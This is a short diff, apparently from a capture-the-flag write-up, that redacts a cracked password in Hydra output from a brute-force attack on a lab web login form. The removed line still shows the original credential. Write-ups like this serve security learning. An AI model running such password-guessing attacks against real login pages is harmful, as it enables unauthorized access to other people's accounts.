@@ -222,7 +222,7 @@ Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-13 11:51:33
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 1326 login tries (l:13/p:102), ~83 tries per task
 [DATA] attacking http-post-form://10.10.244.158:80/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:F=Incorrect
-[80][http-post-form] host: 10.10.244.158   login: enox   password: P@ssword1234
+[80][http-post-form] host: 10.10.244.158   login: enox   password: XXXXX
 ```
 
 ```
